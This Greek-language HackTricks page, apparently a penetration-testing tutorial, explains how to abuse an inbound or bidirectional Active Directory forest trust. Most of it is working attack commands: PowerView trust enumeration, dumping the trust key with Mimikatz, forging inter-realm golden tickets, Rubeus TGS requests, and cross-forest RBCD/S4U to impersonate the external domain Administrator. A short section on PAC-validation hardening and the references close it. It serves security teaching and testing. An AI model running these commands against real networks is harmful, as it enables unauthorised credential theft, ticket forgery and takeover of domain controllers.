# Εξωτερικό Forest Domain - OneWay (Inbound) ή bidirectional

{{#include ../../banners/hacktricks-training.md}}

Σε αυτό το σενάριο ένα external domain σας εμπιστεύεται (ή και τα δύο σας εμπιστεύονται), επομένως μπορείτε να αποκτήσετε κάποιο είδος πρόσβασης σε αυτό.

## Enumeration

Αρχικά, πρέπει να κάνετε **enumerate** το **trust**:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` σάς επιτρέπουν να δείτε γρήγορα αν τα **cross-forest abuse paths** (RBCD, SIDHistory) είναι πιθανό να λειτουργήσουν χωρίς επιπλέον προαπαιτούμενα.<sup>[[2]](#references)</sup>

Στην προηγούμενη enumeration διαπιστώθηκε ότι ο χρήστης **`crossuser`** βρίσκεται μέσα στο group **`External Admins`**, το οποίο έχει **Admin access** μέσα στο **DC του external domain**.

## Initial Access

Αν **δεν μπορέσατε** να βρείτε κάποια **ειδική** πρόσβαση του χρήστη σας στο άλλο domain, μπορείτε και πάλι να επιστρέψετε στο AD Methodology και να δοκιμάσετε να κάνετε **privesc από έναν unprivileged user** (για παράδειγμα, πράγματα όπως το kerberoasting):

Μπορείτε να χρησιμοποιήσετε **Powerview functions** για να κάνετε **enumerate** το **άλλο domain**, χρησιμοποιώντας την παράμετρο `-Domain`, όπως στο:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonation

### Σύνδεση

Χρησιμοποιώντας μια κανονική μέθοδο με τα credentials των χρηστών που έχουν πρόσβαση στο εξωτερικό domain, θα πρέπει να μπορείτε να αποκτήσετε πρόσβαση:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Abuse του SID History

Μπορείτε επίσης να κάνετε abuse του [**SID History**](sid-history-injection.md) μέσω ενός forest trust.

Αν ένας χρήστης μεταφερθεί **από ένα forest σε άλλο** και το **SID Filtering δεν είναι ενεργοποιημένο**, καθίσταται δυνατή η **προσθήκη ενός SID από το άλλο forest**, και αυτό το **SID** θα **προστεθεί στο token του χρήστη** κατά την authentication **μέσω του trust**.

> [!WARNING]
> Ως υπενθύμιση, μπορείτε να αποκτήσετε το signing key με
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Μπορείτε να κάνετε **sign με** το **trusted** key ένα **TGT που κάνει impersonate** τον χρήστη του τρέχοντος domain.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Πλήρης impersonation του χρήστη
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD όταν ελέγχετε έναν λογαριασμό υπολογιστή στο trusting forest (χωρίς SID filtering / selective auth)

Αν το foreign principal (FSP) σας εντάσσει σε μια ομάδα που μπορεί να εγγράφει computer objects στο trusting forest (π.χ. `Account Operators`, custom provisioning group), μπορείτε να ρυθμίσετε **Resource-Based Constrained Delegation** σε έναν target host αυτού του forest και να κάνετε impersonate οποιονδήποτε χρήστη εκεί:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Αυτό λειτουργεί μόνο όταν το **SelectiveAuthentication είναι απενεργοποιημένο** και το **SID filtering** δεν αφαιρεί το SID που ελέγχετε. Είναι ένα γρήγορο lateral path που παρακάμπτει το SIDHistory forging και συχνά παραβλέπεται στις αξιολογήσεις trust.<sup>[[2]](#references)</sup>

### Ενίσχυση επικύρωσης PAC

Οι ενημερώσεις επικύρωσης υπογραφής PAC για τα **CVE-2024-26248**/**CVE-2024-29056** προσθέτουν υποχρεωτική υπογραφή στα inter-forest tickets. Σε **Compatibility mode**, τα forged inter-realm PAC/SIDHistory/S4U paths μπορούν να συνεχίσουν να λειτουργούν σε unpatched DCs. Σε **Enforcement mode**, τα unsigned ή tampered δεδομένα PAC που διασχίζουν ένα forest trust απορρίπτονται, εκτός αν διαθέτετε επίσης το trust key του target forest. Τα registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) μπορούν να το αποδυναμώσουν όσο παραμένουν διαθέσιμα.<sup>[[1]](#references)</sup>

## Αναφορές

- [1] [Microsoft KB5037754 – Αλλαγές στην επικύρωση PAC για τα CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [2] [Προδιαγραφή MS-PAC – Λεπτομέρειες για SID filtering και claims transformation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)

{{#include ../../banners/hacktricks-training.md}}
